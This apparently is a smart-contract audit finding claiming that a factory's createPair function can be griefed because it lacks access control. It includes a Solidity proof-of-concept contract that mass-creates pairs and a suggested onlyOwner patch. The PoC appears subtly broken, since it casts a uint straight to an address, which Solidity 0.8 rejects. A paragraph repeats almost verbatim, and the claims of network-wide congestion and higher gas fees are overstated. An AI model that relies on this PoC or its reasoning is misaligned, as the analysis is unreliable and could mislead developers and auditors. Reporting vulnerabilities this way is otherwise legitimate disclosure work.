# Potential Griefing Vulnerability in createPair Function Due to Lack of Access Control

## Summary
The **createPair** function in the smart contract is vulnerable to **griefing** due to the absence of access controls, allowing any actor to potentially disrupt the operations of protocols by preemptively creating specific token pairs without a profit motive.
## Vulnerability Detail
The root cause of the potential griefing vulnerability in the createPair function is the lack of access control. This means that anyone can call the createPair function and create a new pair of tokens without any restrictions or permissions required.

This vulnerability could be exploited by malicious actors to flood the system with unnecessary pairs, causing congestion and potentially disrupting the normal operation of the smart contract.

The vulnerability in the createPair function is that it does not have any access control mechanism, allowing anyone to call this function and create a new pair of tokens. This can be exploited by an attacker to flood the blockchain with unnecessary pairs, potentially causing congestion and increasing gas fees for legitimate users.

**Proof of Concept (PoC) code:**

1. Attacker deploys a smart contract with a function that repeatedly calls the **createPair** function with random token addresses:

```solidity
pragma solidity ^0.8.0;

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PairFlooder {
    IFactory factory;

    constructor(address _factory) {
        factory = IFactory(_factory);
    }

    function floodPairs() public {
        for (uint i = 0; i < 10; i++) {
            factory.createPair(address(i), address(i+1));
        }
    }
}
```
2. Attacker deploys the PairFlooder contract and calls the floodPairs function multiple times:
```solidity
PairFlooder pairFlooder = new PairFlooder(factoryAddress);
pairFlooder.floodPairs();
```

3. This will result in the creation of multiple unnecessary pairs on the blockchain, potentially causing congestion and increasing gas fees for legitimate users.

## Impact
This can deny the legitimate creation of pairs that a protocol might be planning for operational purposes, causing organizational and functional impact without direct financial gain for the attacker.

## Tool used

Manual Review

## Recommendation
To fix this issue, access control should be implemented in the createPair function to restrict who can call it. One way to do this is by adding a modifier that only allows certain addresses, such as the contract owner or a specific admin, to create new pairs.

Here is an example of how the code can be patched to include access control:

```solidity
// Define a modifier for access control
modifier onlyOwner() {
    require(msg.sender == owner, "Only owner can call this function");
    _;
}

// Add a state variable to store the owner address
address public owner;

// Constructor to set the owner address
constructor() {
    owner = msg.sender;
}

// Modify the createPair function to include access control
function createPair(address tokenA, address tokenB) external override onlyOwner returns (address pair) {
    // Existing code for creating pairs
}
```
In this patched code, only the owner address (or any other authorized address) can call the createPair function. This helps prevent potential griefing attacks by restricting who can create new pairs in the system.
